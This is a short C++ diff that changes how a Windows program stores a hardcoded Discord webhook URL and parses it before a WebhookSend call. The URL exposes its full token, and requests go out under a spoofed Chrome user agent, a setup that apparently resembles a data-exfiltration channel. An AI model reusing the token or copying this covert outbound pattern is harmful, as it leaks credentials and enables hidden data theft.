@@ -41,7 +41,7 @@ namespace fs = std::filesystem;
 // ============================================================================
 // Config
 // ============================================================================
-const char* WEBHOOK = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi";
+const wchar_t* WEBHOOK = L"https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi";
 const wchar_t* USER_AGENT = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
 
 // ============================================================================
@@ -68,8 +68,10 @@ static void WebhookSend(const std::string& title, const std::string& content, in
     if (!hSession) return;
 
     // Parse URL
-    std::wstring hook(WEBHOOK, WEBHOOK + strlen(WEBHOOK));
-    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
+    std::wstring hook(WEBHOOK);
+    URL_COMPONENTS urlComp;
+    ZeroMemory(&urlComp, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
     wchar_t hostName[256] = {0};
     wchar_t urlPath[2048] = {0};
     urlComp.lpszHostName = hostName;
